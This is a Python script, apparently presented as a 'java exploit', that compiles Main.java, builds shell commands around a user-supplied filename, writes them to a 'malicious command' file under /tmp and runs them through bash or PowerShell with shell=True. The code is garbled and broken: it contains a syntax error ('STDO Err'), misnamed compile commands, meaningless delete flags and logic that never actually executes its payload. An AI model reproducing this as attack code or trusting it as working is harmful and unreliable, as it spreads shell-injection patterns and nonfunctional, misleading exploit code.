import os
import subprocess
import re
import sys

def check_os():
    return sys.platform in ['linux', 'darwin']

def compile_java(java_file):
    cmd = f"javac {java_file}" if check_os() else f'java -cp . {java_file}'
    subprocess.run(cmd, shell=True)

def run_java(java_class):
    cmd = f"java {java_class}" if check_os() else f'java -cp . {java_class}'
    return subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

def exploit(filename):
    java_file = "Main.java"
    java_class = "Main"

    if check_os():
        # Java compilation and execution on Linux/MacOS
        compile_java(java_file)
        output = run_java(java_class)
        command = f"echo 'java exploit on {os.getcwd()}'; cat {filename}"
    else:
        # Java compilation and execution on Windows
        compile_java(java_file.replace('/', '\\'))
        command = f'powershell -Command "& \"{os.path.abspath(java_file)}\" && echo \"java exploit on {os.getcwd()}\"; & \"cmd /c type {filename}\""'
        output = run_java(java_class).stdout

    # Inject command into filename input
    if check_os():
        command += f" && cat"
    command += " < /tmp/malicious_command.txt"

    # Create and write the malicious command file
    with open('/tmp/malicious_command.txt', 'w') as f:
        f.write(command)

    # Run the malicious command
    cmd = f'bash -c "cat /tmp/malicious_command.txt"' if check_os() else f'powershell -Command "& (Get-Content -Path \"{os.path.abspath('/tmp/malicious_command.txt')}\")"'
    subprocess.run(cmd, stdout=sys.stdout, stderr=subprocess.STDO Err)

    # Remove the malicious command file
    os.remove('/tmp/malicious_command.txt') if check_os() else subprocess.call('del /f /q /s /d /t /p /a-d /f "\\tmp\\malicious_command.txt"', shell=True)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python exploit.py <filename>")
        sys.exit(1)

    filename = sys.argv[1]
    exploit(filename)

